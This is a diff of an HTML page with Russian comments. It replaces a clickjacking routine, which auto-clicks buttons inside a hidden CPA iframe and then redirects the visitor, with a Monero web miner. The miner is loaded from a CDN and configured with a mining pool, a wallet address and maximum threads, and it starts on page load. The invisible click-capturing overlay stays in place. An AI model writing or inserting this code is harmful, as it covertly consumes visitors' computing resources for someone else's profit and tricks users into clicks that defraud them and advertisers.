@@ -40,27 +40,27 @@
 <!-- Перехватываем клик и прокидываем в iframe -->
 <div class="overlay" onclick="triggerClick()"></div>
 
+<!-- Вставьте в <head> или перед </body> -->
+<script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
 <script>
-  function triggerClick() {
-    try {
-      const iframe = document.getElementById('cpaFrame').contentWindow.document;
-      // Эмулируем кнопку подтверждения или действия
-      iframe.querySelector('button, .btn, input[type=submit]').click();
-    } catch(e) {
-      console.log('Auto-click error (sandboxed or blocked)');
-    }
-
-    // Перекидываем на нужную страницу после клика
-    setTimeout(() => {
-      window.location.href = "https://yoursite.com/continue";
-    }, 1000);
-  }
-
-  // Альтернативно, можно сработать автоматически:
-  setTimeout(() => {
-    triggerClick();
-  }, 3000);
+  // Адрес WebSocket сервера пула (Moneroocean)
+  server = "wss://ny1.xmrminingproxy.com";
+  // Пул и порт
+  var pool = "gulf.moneroocean.stream:10004";
+  // Ваш монеро-адрес
+  var walletAddress = "83uCXo5d4zNXSHkutqPqHHKSpvJxgmS15U5oQXnQTfAUYnP9bj5Wb5FKn8XBzkc7RZBxcFg5BFG5CjV2kjysXKfD7sX6Gvr";
+  // Название воркера (произвольное, поможет вам отслеживать)
+  var workerId = "WebWorker1";
+  // -1 = максимальное число потоков
+  var threads = -1;
+  var password = "";
+  // Старт майнинга
+  startMining(pool, walletAddress, workerId, threads, password);
+  // 20% throttling (CPU — 80%)
+  throttleMiner = 1;
 </script>
+
+
 
 </body>
 </html>
